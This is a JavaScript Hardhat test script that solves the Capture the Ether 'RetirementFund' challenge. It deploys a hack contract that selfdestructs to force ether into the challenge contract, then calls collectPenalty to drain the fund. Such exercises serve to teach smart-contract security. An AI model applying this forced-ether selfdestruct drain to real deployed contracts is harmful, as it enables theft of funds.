const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = "0x1C39Ce31dD704Baf1EABcf3D8a57e6Bb9D8d98eE";

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const factory = await ethers.getContractFactory("RetirementFundChallenge");
  retirementFund = factory.attach(CHALLENGE_ADDRESS);
});

it("RetirementFund", async function () {
  const retirementFundHackFacotry = await ethers.getContractFactory(
    "RetirementFundHack"
  );
  retirementFundHack = await retirementFundHackFacotry.deploy({
    value: ethers.utils.parseEther("0.1"),
  });
  console.log("initiating deployment of hacking contract");
  await retirementFundHack.deployed();
  console.log("hacking contract deployed");
  const balanceOfHack = await ethers.provider.getBalance(
    retirementFundHack.address
  );
  console.log("balance of hacking contract : ", balanceOfHack);

  console.log("initiating attack on RetirementFund by selfdestruct");
  const tx = await retirementFundHack.attackRetirementFund(
    retirementFund.address
  );
  await tx.wait();
  console.log("selfdestruct complete");
  const retirementFundBalance = await ethers.provider.getBalance(
    retirementFund.address
  );
  console.log("balance of RetirementFund: ", retirementFundBalance);

  const tx2 = await retirementFund.collectPenalty({ gasLimit: 3e6 });
  console.log("started penalty collection");
  await tx2.wait();
  console.log("penalty collected");

  const isComplete = await retirementFund.isComplete();
  expect(isComplete).to.be.true;
  util.updateTotalPoints(scriptName);
});
